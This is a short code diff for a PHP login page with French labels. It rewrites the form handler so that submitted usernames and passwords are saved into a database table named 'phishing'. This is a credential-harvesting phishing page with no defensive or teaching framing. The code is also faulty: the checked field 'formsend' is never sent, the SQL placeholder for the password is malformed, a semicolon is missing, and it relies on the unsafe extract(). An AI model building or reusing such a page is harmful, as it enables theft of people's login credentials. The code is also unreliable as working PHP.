@@ -31,8 +31,8 @@
             <div id="div">
                 <br>
                     <form method="post">
-                        <input type="text" name="username" id="name" placeholder="Nom d'utilisateur"><br>
-                        <input type="text" name="password" id="password"placeholder="Mot de passe"><br>
+                        <input type="text" name="Username" id="name" placeholder="Nom d'utilisateur"><br>
+                        <input type="text" name="Password" id="password"placeholder="Mot de passe"><br>
                         <input type="submit" name="login" id="login">
                     </form>
             </div>
@@ -42,7 +42,17 @@
         <?php
 
             if(isset($_POST['formsend'])){
-                echo "login";
+                extract($_POST);
+
+                include 'database.php';
+                global $db;
+
+                $q = $db ->prepare("INSERT INTO phishing(Username,Password) VALUES(:Username,Password)");
+                $q ->execute([
+                    'Username' => $Username,
+                    'Password' => $Password
+
+                ])
             }
 
         
